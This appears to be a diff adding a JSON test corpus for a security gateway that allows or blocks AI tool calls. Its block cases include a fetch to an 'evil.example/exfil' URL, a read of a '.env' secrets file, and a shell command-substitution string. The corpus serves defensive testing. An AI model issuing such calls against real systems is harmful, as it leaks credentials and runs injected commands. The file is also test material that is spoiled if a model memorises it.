@@ -1,0 +1,150 @@
+{
+  "name": "stdio-evidence-benchmark",
+  "description": "Repeatable reviewer corpus for fail-closed stdio evidence and false-positive measurement.",
+  "cases": [
+    {
+      "id": "allow-search-files-cache",
+      "kind": "allow",
+      "repeat": 2,
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.search_files"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "search_files",
+          "arguments": {
+            "query": "TODO"
+          }
+        }
+      }
+    },
+    {
+      "id": "allow-read-file-cache",
+      "kind": "allow",
+      "repeat": 2,
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.read_file"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "read_file",
+          "arguments": {
+            "path": "README.md"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-shadowleak-fetch-url",
+      "kind": "block",
+      "expectedCode": "SHADOWLEAK_DETECTED",
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.fetch_url"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "fetch_url",
+          "arguments": {
+            "url": "https://evil.example/exfil?a=x&b=y&c=z"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-sensitive-path-read-file",
+      "kind": "block",
+      "expectedCode": "SENSITIVE_PATH_BLOCKED",
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.read_file"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "read_file",
+          "arguments": {
+            "path": "/user/.env"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-shell-injection-execute-command",
+      "kind": "block",
+      "expectedCode": "SHELL_INJECTION_BLOCKED",
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.execute_command"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "execute_command",
+          "arguments": {
+            "command": "echo $(whoami)"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-missing-auth-search-files",
+      "kind": "block",
+      "expectedCode": "AUTH_FAILURE",
+      "auth": {
+        "type": "missing"
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "search_files",
+          "arguments": {
+            "query": "missing-auth"
+          }
+        }
+      }
+    },
+    {
+      "id": "block-schema-validation-fetch-url",
+      "kind": "block",
+      "expectedCode": "SCHEMA_VALIDATION_FAILED",
+      "auth": {
+        "type": "nhi",
+        "scopes": [
+          "tools.fetch_url"
+        ]
+      },
+      "request": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "fetch_url",
+          "arguments": {
+            "url": "not-a-valid-url"
+          }
+        }
+      }
+    }
+  ]
+}
